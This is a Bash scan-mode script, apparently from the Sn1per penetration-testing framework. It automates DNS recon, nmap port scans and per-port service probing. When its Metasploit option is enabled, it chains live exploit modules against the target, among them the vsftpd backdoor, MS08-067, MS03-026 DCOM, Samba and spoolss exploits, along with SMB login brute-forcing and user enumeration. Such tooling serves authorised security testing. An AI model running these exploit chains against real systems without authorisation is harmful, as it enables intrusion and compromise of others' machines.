MODE_NAME="normal"
MODE_DESCRIPTION="Standard reconnaissance and vulnerability scan"
MODE_REQUIRED_VARS=(TARGET LOOT_DIR)
MODE_REQUIRED_TOOLS=(nmap dig msfconsole curl)

if [[ "$REPORT" == "1" ]]; then
  args="-t $TARGET"
  [[ "$OSINT" == "1"     ]] && args="$args -o"
  [[ "$AUTO_BRUTE" == "1" ]] && args="$args -b"
  [[ "$FULLNMAPSCAN" == "1" ]] && args="$args -fp"
  [[ "$RECON" == "1"     ]] && args="$args -re"
  [[ "$MODE" == "port"   ]] && args="$args -m port"
  [[ -n "$PORT"          ]] && args="$args -p $PORT"
  [[ -n "$WORKSPACE"     ]] && args="$args -w $WORKSPACE"
  args="$args --noreport"
  sniper $args | tee "$LOOT_DIR/output/sniper-$TARGET-$(date +%Y%m%d%H%M).txt" 2>&1
  exit
fi

logo

[[ -n "$WORKSPACE" ]] && LOOT_DIR=$WORKSPACE_DIR

echo "$TARGET" >> "$LOOT_DIR/domains/targets.txt"
[[ -z "$MODE" ]] && MODE="normal"
echo "$TARGET $MODE $(date +%Y-%m-%d %H:%M)" >> "$LOOT_DIR/scans/tasks.txt" 2>/dev/null
echo "sniper -t $TARGET -m $MODE --noreport $args" >> "$LOOT_DIR/scans/${TARGET}-${MODE}.txt"
echo "sniper -t $TARGET -m $MODE --noreport $args" >> "$LOOT_DIR/scans/running_${TARGET}_${MODE}.txt"
ls -lh "$LOOT_DIR/scans/running_"*.txt 2>/dev/null | wc -l > "$LOOT_DIR/scans/tasks-running.txt"

echo "[sn1persecurity.com] Started Sn1per scan: $TARGET [${MODE}] ($(date +%Y-%m-%d %H:%M))" >> "$LOOT_DIR/scans/notifications_new.txt"
notify_slack "[sn1persecurity.com] Started Sn1per scan: $TARGET [${MODE}] ($(date +%Y-%m-%d %H:%M))"

section_banner
section_header "GATHERING DNS INFO"
dig all +short "$TARGET" > "$LOOT_DIR/nmap/dns-$TARGET.txt" 2>/dev/null
dig all +short -x "$TARGET" >> "$LOOT_DIR/nmap/dns-$TARGET.txt" 2>/dev/null
host "$TARGET" 2>/dev/null | grep address | awk '{print $NF}' >> "$LOOT_DIR/ips/ips-all-unsorted.txt" 2>/dev/null
mv -f "$LOOT_DIR/domain/"*_ips.txt "$LOOT_DIR/ips/" 2>/dev/null

section_banner
section_header "CHECKING FOR SUBDOMAIN HIJACKING"
grep -E -i "anima|bitly|wordpress|instapage|heroku|github|bitbucket|squarespace|fastly|feed|fresh|ghost|helpscout|helpjuice|instapage|pingdom|surveygizmo|teamwork|tictail|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign|monitor|cargocollective|statuspage|tumblr|amazon|hubspot|cloudfront|modulus|unbounce|uservoice|wpengine|cloudapp" \
  "$LOOT_DIR/nmap/dns-$TARGET.txt" 2>/dev/null \
  > "$LOOT_DIR/nmap/takeovers-$TARGET.txt" 2>/dev/null

source "$INSTALL_DIR/modes/osint.sh"
source "$INSTALL_DIR/modes/recon.sh"

section_banner
section_header "PINGING HOST"
ping -c 1 "$TARGET"

section_banner
section_header "RUNNING TCP PORT SCAN"
mv -f "$LOOT_DIR/nmap/ports-$TARGET.txt" "$LOOT_DIR/nmap/ports-$TARGET.old" 2>/dev/null

NMAP_XML="$LOOT_DIR/nmap/nmap-$TARGET.xml"
if [[ "$MODE" == "web" || "$MODE" == "webscan" ]]; then
  nmap -p 80,443 $NMAP_OPTIONS --open "$TARGET" -oX "$NMAP_XML" | sed -r "s/</\&lh\;/g" | tee "$LOOT_DIR/nmap/nmap-$TARGET.txt"
elif [[ -n "$PORT" ]]; then
  nmap -p "$PORT" $NMAP_OPTIONS --open "$TARGET" -oX "$NMAP_XML" | sed -r "s/</\&lh\;/g" | tee "$LOOT_DIR/nmap/nmap-$TARGET.txt"
else
  nmap -p "$DEFAULT_PORTS" $NMAP_OPTIONS --open "$TARGET" -oX "$NMAP_XML" | sed -r "s/</\&lh\;/g" | tee "$LOOT_DIR/nmap/nmap-$TARGET.txt"
fi

rm -f "$LOOT_DIR/nmap/ports-$TARGET.txt" 2>/dev/null
nmap_parse_xml_for_ports "$NMAP_XML"

if nmap_host_is_up "$LOOT_DIR/nmap/nmap-$TARGET.txt"; then
  echo "$TARGET" >> "$LOOT_DIR/nmap/livehosts-unsorted.txt" 2>/dev/null
fi
sort -u "$LOOT_DIR/nmap/livehosts-unsorted.txt" 2>/dev/null > "$LOOT_DIR/nmap/livehosts-sorted.txt" 2>/dev/null
diff "$LOOT_DIR/nmap/ports-$TARGET.old" "$LOOT_DIR/nmap/ports-$TARGET.txt" 2>/dev/null > "$LOOT_DIR/nmap/ports-$TARGET.diff"
nmap_extract_mac "$LOOT_DIR/nmap/nmap-$TARGET.txt" > "$LOOT_DIR/nmap/macaddress-$TARGET.txt" 2>/dev/null
nmap_extract_os "$LOOT_DIR/nmap/nmap-$TARGET.txt" > "$LOOT_DIR/nmap/osfingerprint-$TARGET.txt" 2>/dev/null

notify_slack_file "$LOOT_DIR/nmap/ports-$TARGET.txt"

if [[ -s "$LOOT_DIR/nmap/ports-$TARGET.diff" ]]; then
  echo "[sn1persecurity.com] Port change detected on $TARGET ($(date +%Y-%m-%d %H:%M))" >> "$LOOT_DIR/scans/notifications_new.txt"
  grep -E "<|>" "$LOOT_DIR/nmap/ports-$TARGET.diff" >> "$LOOT_DIR/scans/notifications_new.txt"
  notify_slack "[sn1persecurity.com] Port change detected on $TARGET ($(date +%Y-%m-%d %H:%M))"
  notify_slack_file "$LOOT_DIR/nmap/ports-$TARGET.diff"
fi

if [[ "$HTTP_PROBE" == "1" ]]; then
  section_banner
  section_header "RUNNING HTTP PROBE"
  echo "$TARGET" | fprobe -c 200 -p xlarge | tee "$LOOT_DIR/web/httprobe-$TARGET.txt" 2>/dev/null
  echo "$TARGET" | fprobe -c 200 -p xlarge -v | tee "$LOOT_DIR/web/httprobe-$TARGET-verbose.txt" 2>/dev/null
fi

# Per-port intrusive scans
section_banner
section_header "RUNNING INTRUSIVE SCANS"

declare -a OPEN_PORTS
nmap_open_port_array "$NMAP_XML" OPEN_PORTS

SMB_DETECTED=0
WEB_PORTS=()

for port in "${OPEN_PORTS[@]}"; do
  section_banner
  section_header "Port $port opened... running tests..."

  case $port in
    21)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 21 "ftp-*,/usr/share/nmap/scripts/vulners"
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run "$TARGET" 21 "setg RHOSTS $TARGET; use auxiliary/scanner/ftp/ftp_version; run" "ftp_version"
        msf_run "$TARGET" 21 "setg RHOSTS $TARGET; use auxiliary/scanner/ftp/anonymous; run" "anonymous"
        msf_run "$TARGET" 21 "setg RHOSTS $TARGET; use exploit/unix/ftp/vsftpd_234_backdoor; run" "vsftpd_234_backdoor"
        msf_run "$TARGET" 21 "setg RHOSTS $TARGET; use unix/ftp/proftpd_133c_backdoor; run" "proftpd_133c_backdoor"
      fi
      ;;

    22)
      if [[ "$SSH_AUDIT" == "1" ]]; then
        if [[ $DISTRO == "blackarch" ]]; then
          /bin/ssh-audit "$TARGET:22" | tee "$LOOT_DIR/output/sshaudit-$TARGET-port22.txt"
        else
          cd "$PLUGINS_DIR/ssh-audit" && python3 ssh-audit.py "$TARGET:22" | tee "$LOOT_DIR/output/sshaudit-$TARGET-port22.txt"
          cd "$INSTALL_DIR"
        fi
      fi
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 22 "ssh-*,/usr/share/nmap/scripts/vulners"
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run "$TARGET" 22 "setg USER_FILE $USER_FILE; setg RHOSTS $TARGET; use scanner/ssh/ssh_version; run" "ssh_version"
        msf_run "$TARGET" 22 "setg USER_FILE $USER_FILE; setg RHOSTS $TARGET; use scanner/ssh/ssh_enumusers; run" "ssh_enumusers"
        msf_run "$TARGET" 22 "setg RHOSTS $TARGET; use scanner/ssh/libssh_auth_bypass; run" "libssh_auth_bypass"
      fi
      ;;

    23)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 23 "telnet*,/usr/share/nmap/scripts/vulners"
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run_simple "$TARGET" 23 \
          "use scanner/telnet/lantronix_telnet_password; setg RHOSTS $TARGET; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run" \
          "telnet"
      fi
      ;;

    25)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 25 "smtp*,/usr/share/nmap/scripts/vulners"
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run_simple "$TARGET" 25 \
          "use scanner/smtp/smtp_enum; setg RHOSTS $TARGET; run" \
          "smtp_enum"
      fi
      ;;

    53)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 53 "dns*,/usr/share/nmap/scripts/vulners"
      ;;

    67) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -sU -sV -Pn -v --script-timeout 90 --script="dhcp*,/usr/share/nmap/scripts/vulners" -p 67 "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port67.txt" ;;
    68) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -sU -sV -Pn -v --script-timeout 90 --script="dhcp*,/usr/share/nmap/scripts/vulners" -p 68 "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port68.txt" ;;
    69) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -sU -sV -Pn -v --script-timeout 90 --script="tftp*,/usr/share/nmap/scripts/vulners" -p 69 "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port69.txt" ;;
    79) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 79 "finger*,/usr/share/nmap/scripts/vulners" ;;
    80|443|8080|8443|8000|8001|8888) WEB_PORTS+=("$port") ;;
    110) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 110 "pop*,/usr/share/nmap/scripts/vulners" ;;
    111)
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run_simple "$TARGET" 111 \
          "use auxiliary/scanner/nfs/nfsmount; setg RHOSTS $TARGET; run" \
          "nfsmount"
      fi
      [[ "$SHOW_MOUNT" == "1" ]] && showmount -a "$TARGET" | tee "$LOOT_DIR/output/showmount-$TARGET-port111a.txt" && \
        showmount -d "$TARGET" | tee "$LOOT_DIR/output/showmount-$TARGET-port111d.txt" && \
        showmount -e "$TARGET" | tee "$LOOT_DIR/output/showmount-$TARGET-port111e.txt"
      ;;
    123) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -sU -sV -Pn -v --script-timeout 90 --script="ntp-*,/usr/share/nmap/scripts/vulners" -p 123 "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port123.txt" ;;
    135)
      [[ "$RPC_INFO" == "1" ]] && rpcinfo -p "$TARGET" | tee "$LOOT_DIR/output/rpcinfo-$TARGET-port135.txt"
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 135 "rpc*,/usr/share/nmap/scripts/vulners"
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run "$TARGET" 135 "use exploit/windows/dcerpc/ms03_026_dcom; run" "ms03_026_dcom"
      fi
      ;;
    137)
      [[ "$RPC_INFO" == "1" ]] && rpcinfo -p "$TARGET" | tee "$LOOT_DIR/output/rpcinfo-$TARGET-port137.txt"
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -p 137 -v --script-timeout 90 --script="broadcast-netbios-master-browser*,/usr/share/nmap/scripts/vulners" "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port137.txt"
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run_simple "$TARGET" 137 "use auxiliary/scanner/netbios/nbname; setg RHOSTS $TARGET; run" nbname
      fi
      ;;
    139)
      SMB_DETECTED=1
      if [[ "$SMB_ENUM" == "1" ]]; then
        section_header "ENUMERATING SMB/NETBIOS"
        enum4linux "$TARGET" | tee "$LOOT_DIR/output/enum4linux-$TARGET-port139.txt"
        python3 /usr/share/doc/python3-impacket/examples/samrdump.py "$TARGET" | tee "$LOOT_DIR/output/samrdump-$TARGET-port139.txt"
        nbtscan "$TARGET" | tee "$LOOT_DIR/output/nbtscan-$TARGET-port139.txt"
      fi
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 139 "smb*,/usr/share/nmap/scripts/vulners"
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run_simple "$TARGET" 139 \
          "setg LHOST $MSF_LHOST; setg LPORT $MSF_LPORT; use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS $TARGET; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use auxiliary/scanner/smb/smb_ms17_010; run" \
          "smb"
      fi
      ;;
    161)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -v --script-timeout 90 --script="/usr/share/nmap/scripts/vulners,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse" -sV -A -p 161 -sU -sT "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port161.txt"
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run_simple "$TARGET" 161 "use scanner/snmp/snmp_enum; setg RHOSTS $TARGET; run" snmp_enum
      fi
      ;;
    162)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -v --script-timeout 90 --script="/usr/share/nmap/scripts/vulners,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse" -sV -A -p 162 -sU -sT "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port162.txt"
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run_simple "$TARGET" 162 "use scanner/snmp/snmp_enum; setg RHOSTS $TARGET; run" snmp_enum
      fi
      ;;
    264)  if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then msf_run_simple "$TARGET" 264 "use auxiliary/gather/checkpoint_hostname; setg RHOSTS $TARGET; run" checkpoint_hostname; fi ;;
    389)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 389 "ldap*,/usr/share/nmap/scripts/vulners"
      ldapsearch -h "$TARGET" 389 -x -s base -b '' "(objectClass=*)" "*" + | tee "$LOOT_DIR/output/ldapsearch-$TARGET-port389.txt"
      ;;
    445)
      if [[ $SMB_DETECTED -eq 1 ]]; then
        log_info "Port 445 SMB already scanned via port 139... skipping."
      else
        if [[ "$SMB_ENUM" == "1" ]]; then
          section_header "ENUMERATING SMB/NETBIOS"
          enum4linux "$TARGET" | tee "$LOOT_DIR/output/enum4linux-$TARGET-port445.txt"
          python3 /usr/share/doc/python3-impacket/examples/samrdump.py "$TARGET" | tee "$LOOT_DIR/output/samrdump-$TARGET-port445.txt"
          nbtscan "$TARGET" | tee "$LOOT_DIR/output/nbtscan-$TARGET-port445.txt"
        fi
        [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 445 "smb*,/usr/share/nmap/scripts/vulners"
        if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
          msf_run_simple "$TARGET" 445 \
            "setg LHOST $MSF_LHOST; setg LPORT $MSF_LPORT; use auxiliary/scanner/smb/smb_version; run; use auxiliary/scanner/smb/pipe_auditor; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use exploit/windows/smb/ms06_040_netapi; run; use exploit/windows/smb/ms05_039_pnp; run; use exploit/windows/smb/ms10_061_spoolss; run; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_ms17_010; run" \
            "smb445"
          msf_run "$TARGET" 445 "use linux/samba/is_known_pipename; run" "is_known_pipename"
        fi
      fi
      ;;
    500) if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then msf_run_simple "$TARGET" 500 \
           "use auxiliary/scanner/ike/cisco_ike_benigncertain; set RHOSTS $TARGET; set PACKETFILE /usr/share/metasploit-framework/data/exploits/cve-2016-6415/sendpacket.raw; set THREADS 24; set RPORT 500; run" \
           cisco_ike_benigncertain; fi ;;
    512) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 512 "rexec*,/usr/share/nmap/scripts/vulners" ;;
    513) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 513 "rlogin*,/usr/share/nmap/scripts/vulners" ;;
    514) [[ "$AMAP" == "1" ]] && amap "$TARGET" 514 -A ;;
    1099)
      [[ "$AMAP" == "1" ]] && amap "$TARGET" 1099 -A
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 1099 "rmi-*,/usr/share/nmap/scripts/vulners"
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run_simple "$TARGET" 1099 "use gather/java_rmi_registry; set RHOST $TARGET; run" java_rmi_registry
        msf_run_simple "$TARGET" 1099 "use scanner/misc/java_rmi_server; set RHOST $TARGET; run" java_rmi_server
      fi
      ;;
    1433) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 1433 "ms-sql*,/usr/share/nmap/scripts/vulners" ;;
    1524) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -sV -Pn -v --script-timeout 90 --script="/usr/share/nmap/scripts/vulners" -p 1524 "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port1524.txt" ;;
    2049)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 2049 "nfs*,/usr/share/nmap/scripts/vulners"
      [[ "$RPC_INFO" == "1" ]] && rpcinfo -p "$TARGET"
      [[ "$SHOW_MOUNT" == "1" ]] && showmount -e "$TARGET"
      [[ "$SMB_ENUM" == "1" ]] && smbclient -L "$TARGET" -U "%" ""
      ;;
    2181) echo stat | nc "$TARGET" 2181 | tee "$LOOT_DIR/output/zookeeper-$TARGET-port2181.txt" ;;
    3306)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 3306 "mysql*,/usr/share/nmap/scripts/vulners"
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run_simple "$TARGET" 3306 "use auxiliary/scanner/mssql/mssql_ping; setg RHOSTS $TARGET; run" mssql_ping
      fi
      ;;
    3310) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -p 3310 -Pn -sV -v --script-timeout 90 --script="clamav-exec,/usr/share/nmap/scripts/vulners" "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port3310.txt" ;;
    3128) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -p 3128 -Pn -sV -v --script-timeout 90 --script="*proxy*,/usr/share/nmap/scripts/vulners" "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port3128.txt" ;;
    3389)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 3389 "rdp-*,/usr/share/nmap/scripts/vulners"
      if [[ "$METASPLOIT_EXPLOIT" == "1" ]]; then
        msf_run_simple "$TARGET" 3389 "use auxiliary/scanner/rdp/ms12_020_check; setg RHOSTS $TARGET; run" ms12_020_check
        msf_run_simple "$TARGET" 3389 "use scanner/rdp/cve_2019_0708_bluekeep; setg RHOSTS $TARGET; run" cve_2019_0708_bluekeep
      fi
      rdesktop "$TARGET" &
      ;;
    3632|5900|5984|6667|7001|9200|9495|10000|16992|27017|27018|27019|28017|49180|49152)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -sV -Pn -v --script-timeout 90 --script="/usr/share/nmap/scripts/vulners" -p "$port" "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port${port}.txt"
      ;;
    5432)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -sV -Pn -v -p 5432 --script-timeout 90 --script="pgsql*,/usr/share/nmap/scripts/vulners" "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port5432.txt"
      ;;
    5555) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" 5555 "*/usr/share/nmap/scripts/vulners" ;;
    5800|5900)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap_run "$TARGET" "$port" "vnc*,/usr/share/nmap/scripts/vulners"
      ;;
    623|624) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -sV -Pn -v --script-timeout 90 --script="ipmi*,/usr/share/nmap/scripts/vulners" -p "$port" "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port${port}.txt" ;;
    2121) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -sV -Pn -v --script-timeout 90 --script="ftp*,/usr/share/nmap/scripts/vulners" -p 2121 "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port2121.txt" ;;
    4443) [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -sV -Pn -v --script-timeout 90 --script="http*,/usr/share/nmap/scripts/vulners" -p 4443 "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port4443.txt" ;;
    8180)
      [[ "$NMAP_SCRIPTS" == "1" ]] && nmap -A -sV -Pn -v --script-timeout 90 --script="http*,/usr/share/nmap/scripts/vulners" -p 8180 "$TARGET" | tee "$LOOT_DIR/output/nmap-$TARGET-port8180.txt"
      WEB_PORTS+=("$port")
      ;;
  esac
done

# Web service scanning (ports 80, 443, 8080, 8443, 8000, 8001, 8888, 8180)
for wp in "${WEB_PORTS[@]}"; do
  section_banner
  section_header "RUNNING WEB TESTS ON PORT $wp"
  source "$INSTALL_DIR/modes/sc0pe-active-webscan.sh"
done

# If no web ports discovered but this is a web mode, run web scans on default ports
if [[ ${#WEB_PORTS[@]} -eq 0 && "$MODE" == "web" ]]; then
  source "$INSTALL_DIR/modes/sc0pe-active-webscan.sh"
fi

section_banner
section_header "SCAN COMPLETE"
